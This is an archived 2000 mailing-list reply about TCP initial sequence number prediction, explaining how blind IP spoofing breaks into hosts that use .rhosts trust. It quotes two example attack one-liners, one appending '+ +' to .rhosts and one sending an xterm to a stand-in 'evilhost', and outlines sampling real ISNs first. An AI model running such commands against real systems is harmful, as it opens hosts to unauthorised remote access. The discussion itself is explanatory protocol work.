@@ -1,0 +1,138 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"
+                      "http://www.w3.org/TR/REC-html40/loose.dtd">
+<HTML>
+<HEAD>
+<TITLE>TCP-IMPL Mailing List Archive: Re: TCP sequence numbers</TITLE>
+<META NAME="Author" CONTENT="der Mouse  (mouse@Rodents.Montreal.QC.CA)">
+<META NAME="Subject" CONTENT="Re: TCP sequence numbers">
+</HEAD>
+<BODY BGCOLOR="#FFFFFF" TEXT="#000000">
+<H1>Re: TCP sequence numbers</H1>
+<!-- received="Thu Sep 21 14:07:49 2000" -->
+<!-- isoreceived="20000921180749" -->
+<!-- sent="Thu, 21 Sep 2000 13:56:03 -0400 (EDT)" -->
+<!-- isosent="20000921175603" -->
+<!-- name="der Mouse " -->
+<!-- email="mouse@Rodents.Montreal.QC.CA" -->
+<!-- subject="Re: TCP sequence numbers" -->
+<!-- id="200009211756.NAA28135@Twig.Rodents.Montreal.QC.CA" -->
+<!-- inreplyto="TCP sequence numbers" -->
+<STRONG>From:</STRONG> der Mouse  (<A HREF="mailto:mouse@Rodents.Montreal.QC.CA?Subject=Re:%20TCP%20sequence%20numbers&In-Reply-To=&lt;200009211756.NAA28135@Twig.Rodents.Montreal.QC.CA&gt;"><EM>mouse@Rodents.Montreal.QC.CA</EM></A>)<BR>
+<STRONG>Date:</STRONG> Thu Sep 21 2000 - 13:56:03 EDT
+<P>
+<!-- next="start" -->
+<LI><STRONG>Next message:</STRONG> <A HREF="2375.html">Vern Paxson: "adios tcpimpl (the working group, but not the mailing list)"</A>
+<UL>
+<LI><STRONG>Previous message:</STRONG> <A HREF="2373.html">RFC Editor: "RFC 2923 on TCP Problems with Path MTU Discovery"</A>
+<LI><STRONG>Maybe in reply to:</STRONG> <A HREF="2351.html">T Srivathsa: "TCP sequence numbers"</A>
+<!-- nextthread="start" -->
+<!-- reply="end" -->
+<LI><STRONG>Messages sorted by:</STRONG> 
+<A HREF="date.html#2374">[ date ]</A>
+<A HREF="index.html#2374">[ thread ]</A>
+<A HREF="subject.html#2374">[ subject ]</A>
+<A HREF="author.html#2374">[ author ]</A>
+</UL>
+<HR NOSHADE><P>
+<!-- body="start" -->
+<P>
+<EM>&gt;&gt;&gt; Why is guessing the sequence number of the first packet before it
+</EM><BR>
+<EM>&gt;&gt;&gt; arrives such a big deal?
+</EM><BR>
+<EM>&gt;&gt; Because it allows you to impersonate an arbitrary IP address,
+</EM><BR>
+<EM>&gt;&gt; provided you don't care about seeing what the victim sends back, and
+</EM><BR>
+<EM>&gt;&gt; provided that the host you're impersonating doesn't [notice].
+</EM><BR>
+<EM>&gt; If you don't see the syn I think it is fair enough to say we don't
+</EM><BR>
+<EM>&gt; see the rest of the session.
+</EM><BR>
+<P>Right.  &quot;provided you don't care about seeing what the victim sends
+<BR>
+back&quot;, I wrote, and this is what I was talking about.
+<BR>
+<P><EM>&gt; So it's a one sided conversation hoping that the server is lisening.
+</EM><BR>
+<P>Right.
+<BR>
+<P>Machines configured with .rhosts-style trust have been broken into this
+<BR>
+way.  You don't need more than the likes of
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsh victim &quot;echo + + &gt;&gt; .rhosts&quot;
+<BR>
+or
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsh victim &quot;xterm -display evilhost:14&quot;
+<BR>
+which are small and simple enough to do open-loop.  One can't do
+<BR>
+anything very elaborate over a source-spoofed connection, but - if the
+<BR>
+victim host is vulnerable to this sort of chicanery - one doesn't need
+<BR>
+anything very elaborate.
+<BR>
+<P>As someone already pointed out, hosts which are that vulnerable are
+<BR>
+being ruthlessly culled from the net.  (Perhaps fortunately....)
+<BR>
+<P><EM>&gt; If I am close enough to guess the clock value surly I am not on the
+</EM><BR>
+<EM>&gt; wrong side of a router; or are we to assume a deterministic router.
+</EM><BR>
+<P>Oh, you don't just guess everything out of the blue.  First you
+<BR>
+establish a &quot;legitimate&quot; (=unforged) connection to the victim, so's to
+<BR>
+get a real ISN.  Depending on how the victim generates ISNs you may
+<BR>
+need to do this many times to get enough information to succeed in your
+<BR>
+guessing....
+<BR>
+<P><EM>&gt; I'm sorry but if I am going to do this I am going to do it where I
+</EM><BR>
+<EM>&gt; can see the reply and I aren't going to bother guessing the ISN.
+</EM><BR>
+<P>Sure, if you can, that's surer.  But your skr1pt kiddie with a modem
+<BR>
+and too much time on his hands generally is in no position to sniff
+<BR>
+traffic between the victim and any host it trusts.
+<BR>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;der Mouse
+<BR>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<A HREF="mailto:mouse@rodents.montreal.qc.ca?Subject=Re:%20TCP%20sequence%20numbers&In-Reply-To=&lt;200009211756.NAA28135@Twig.Rodents.Montreal.QC.CA&gt;">mouse@rodents.montreal.qc.ca</A>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7D C8 61 52 5D E7 2D 39  4E F1 31 3E E8 B3 27 4B
+<BR>
+<P><!-- body="end" -->
+<HR NOSHADE>
+<UL>
+<!-- next="start" -->
+<LI><STRONG>Next message:</STRONG> <A HREF="2375.html">Vern Paxson: "adios tcpimpl (the working group, but not the mailing list)"</A>
+<LI><STRONG>Previous message:</STRONG> <A HREF="2373.html">RFC Editor: "RFC 2923 on TCP Problems with Path MTU Discovery"</A>
+<LI><STRONG>Maybe in reply to:</STRONG> <A HREF="2351.html">T Srivathsa: "TCP sequence numbers"</A>
+<!-- nextthread="start" -->
+<!-- reply="end" -->
+<LI><STRONG>Messages sorted by:</STRONG> 
+<A HREF="date.html#2374">[ date ]</A>
+<A HREF="index.html#2374">[ thread ]</A>
+<A HREF="subject.html#2374">[ subject ]</A>
+<A HREF="author.html#2374">[ author ]</A>
+</UL>
+<!-- trailer="footer" -->
+<HR NOSHADE>
+<P>
+<SMALL>
+<EM>
+This archive was generated by <A HREF="http://www.hypermail.org/">hypermail 2b29</A> 
+: <EM>Thu Sep 21 2000 - 14:08:21 EDT</EM>
+</EM>
+</SMALL>
+</BODY>
+</HTML>
